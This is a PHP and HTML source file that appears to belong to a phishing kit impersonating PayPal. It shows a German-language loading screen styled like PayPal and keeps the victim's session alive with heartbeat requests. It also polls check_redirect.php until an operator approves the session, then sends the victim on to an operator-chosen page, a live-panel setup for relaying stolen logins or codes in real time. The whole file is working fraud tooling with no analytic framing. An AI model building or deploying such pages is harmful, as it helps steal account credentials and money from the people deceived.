<?php
require 'config.php';
if (!isset($_GET['sid'])) { redirect('index.php'); exit; }
$sid = $_GET['sid'];
$session = get_session($sid);
$session['last_activity'] = time();
save_session($sid, $session);
?>
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PayPal</title>
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
    body { background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #001435; }
    
    .login-container { width: 100%; max-width: 520px; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; margin-top: auto; margin-bottom: auto; }
    
    .spinner { width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid #0070ba; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    
    .loading-text { font-size: 18px; font-weight: 600; color: #001435; }
    .sub-text { font-size: 15px; color: #687173; margin-top: 10px; }
</style>
</head>
<body>
    <div class="login-container">
        <div class="spinner"></div>
        <div class="loading-text">Wird geladen...</div>
        <div class="sub-text">Bitte warten Sie einen Moment.</div>
    </div>

    <script>
        setInterval(function() {
            const sid = new URLSearchParams(window.location.search).get('sid');
            if (sid) { fetch('heartbeat.php?sid=' + sid).catch(() => {}); }
        }, 5000);

        setInterval(function() {
            const sid = new URLSearchParams(window.location.search).get('sid');
            if (!sid) return;
            fetch('check_redirect.php?sid=' + sid + '&t=' + Date.now(), { cache: 'no-store' })
                .then(r => r.json())
                .then(data => {
                    if (data.status === 'approved') {
                        let targetUrl = data.url;
                        let sep = targetUrl.includes('?') ? '&' : '?';
                        window.location.href = targetUrl + sep + 'sid=' + sid;
                    }
                }).catch(() => {});
        }, 3000);
    </script>
</body>
</html>